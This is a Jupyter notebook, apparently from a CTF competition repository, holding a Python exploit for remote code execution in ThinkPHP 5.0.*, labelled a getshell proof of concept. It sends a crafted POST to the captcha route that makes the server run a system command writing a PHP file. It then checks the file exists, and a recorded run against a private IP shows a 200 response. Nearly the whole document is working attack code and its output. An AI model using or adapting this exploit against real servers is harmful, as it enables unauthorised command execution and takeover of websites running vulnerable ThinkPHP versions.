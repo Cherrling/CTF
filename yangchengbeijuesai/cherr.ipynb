{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "# thinkphp 5.0.* 通杀getshell poc_1\n",
    "import requests\n",
    "\n",
    "\n",
    "def post_command(host):\n",
    "    headers = {\n",
    "        \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0\",\n",
    "        \"Content-Type\": \"application/x-www-form-urlencoded\"\n",
    "    }\n",
    "\n",
    "    data = {\n",
    "        \"_method\": \"__construct\",\n",
    "        \"filter[]\": \"system\",\n",
    "        \"method\": \"get\",\n",
    "        \"server[REQUEST_METHOD]\": \"echo 202cb962ac59075b964b07152d234b70 > 11.php\"\n",
    "    }\n",
    "    target = host + \"/public/index.php?s=captcha\"\n",
    "    print(\"Request: {}\".format(target))\n",
    "    r = requests.post(target, data=data, headers=headers)\n",
    "    print(f'r:{r}')\n",
    "    return True\n",
    "\n",
    "\n",
    "# 验证 11.php是否存在\n",
    "def md5_file_is_exist(host):\n",
    "    rs = requests.get(host+\"/public/11.php\")\n",
    "    if rs.status_code == 200 and \"202cb962ac59075b964b07152d234b70\" in rs.text:\n",
    "        return True\n",
    "\n",
    "\n",
    "class Exploit(object):\n",
    "\n",
    "    def attack(self, url):\n",
    "        post_command(url)\n",
    "        if md5_file_is_exist(url):\n",
    "            return \"getshell ok. {}\".format(url+\"/public/11.php\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Request: http://10.1.167.10/public/index.php?s=captcha\n",
      "r:<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "host=\"http://10.1.167.10\"\n",
    "# post_command(host)\n",
    "\n",
    "\n",
    "a=Exploit()\n",
    "a.attack(host)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
